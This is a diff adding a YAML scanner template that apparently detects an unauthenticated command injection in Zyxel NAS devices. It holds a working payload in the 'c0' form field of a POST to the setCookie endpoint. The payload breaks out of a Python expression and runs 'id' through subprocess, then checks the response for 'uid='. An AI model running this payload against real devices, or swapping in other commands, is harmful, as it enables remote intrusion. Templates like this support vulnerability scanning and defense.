@@ -1,0 +1,28 @@
+id:
+
+info:
+  name: Zyxel NAS设备 setCookie 未授权命令注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /cmd,/simZysh/register_main/setCookie
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6
+  data: |
+    ------WebKitFormBoundaryHHaZAYecVOf5sfa6
+    Content-Disposition: form-data; name="c0"
+  
+    storage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("id", shell=True)#
+    ------WebKitFormBoundaryHHaZAYecVOf5sfa6--
+response1:
+  headers:
+  body: uid=
+  code: 200
+requests2:
+response2:
